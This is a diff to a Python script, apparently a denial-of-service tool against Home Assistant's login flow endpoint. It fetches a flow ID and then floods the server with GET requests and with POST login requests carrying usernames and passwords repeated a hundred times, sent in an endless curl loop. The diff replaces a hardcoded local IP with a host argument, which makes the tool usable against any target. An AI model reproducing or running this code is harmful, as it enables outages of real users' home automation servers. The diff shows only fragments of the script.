@@ -11,15 +11,14 @@ import sys
 import json
 
 def get_flow_id(host):
-    data = "{\"client_id\":\"http://192.168.1.142:8123/\",\"handler\":[\"homeassistant\",null],\"redirect_uri\":\"http://192.168.1.142:8123/lovelace/0?auth_callback=1\"}"
+    data = "{\"client_id\":\"http://"+ host +"/\",\"handler\":[\"homeassistant\",null],\"redirect_uri\":\"http://"+ host +"/lovelace/0?auth_callback=1\"}"
     headers = "-H \'Content-Type: text/plain;charset=UTF-8\'"
-
-    # host = "192.168.1.142:8123/auth/login_flow"
     host = host + "/auth/login_flow"
-    result = subprocess.run(["curl", "-d", data, headers, host, "-s"], stdout=subprocess.PIPE)
+
+    curl_result = subprocess.run(["curl", "-d", data, headers, host, "-s"], stdout=subprocess.PIPE)
     flow_id = ""
     try:
-        json_object = json.loads(result.stdout.decode())
+        json_object = json.loads(curl_result.stdout.decode())
 
         # Make sure we are dealing with homeassistant server and not with other server who might use the same Json format.
         # Do this if an user enters a non-HomeAssistant address but somehow still get the flow_id
@@ -35,7 +34,7 @@ def get_flow_id(host):
 # Perform DOS attack with GET requests
 # This function is a modification of get_flow_id()
 def dos_get(host):
-    data = "{\"client_id\":\"http://192.168.1.142:8123/\",\"handler\":[\"homeassistant\",null],\"redirect_uri\":\"http://192.168.1.142:8123/lovelace/0?auth_callback=1\"}"
+    data = "{\"client_id\":\"http://"+ host +"/\",\"handler\":[\"homeassistant\",null],\"redirect_uri\":\"http://"+ host +"/lovelace/0?auth_callback=1\"}"
     headers = "-H \'Content-Type: text/plain;charset=UTF-8\'"
     host = host + "/auth/login_flow"
 
@@ -53,12 +52,13 @@ def dos_get(host):
 # Perform DOS attack with POST requests
 def dos_post(host, flow_id):
     # Get ready for to send POST requsts
+    client_id = host
     host = host + "/auth/login_flow/" + flow_id
     username = "username" * 100
     username = "\"" + username + "\""
     password = "password" * 100
     password = "\"" + password + "\""
-    data = "{\"username\":" + username + ",\"password\":" + password + ",\"client_id\":\"http://192.168.1.142:8123/\"}"
+    data = "{\"username\":" + username + ",\"password\":" + password + ",\"client_id\":\"http://"+ client_id +"/\"}"
 
     # Begin attack: sending POST login request using curl
     while True:
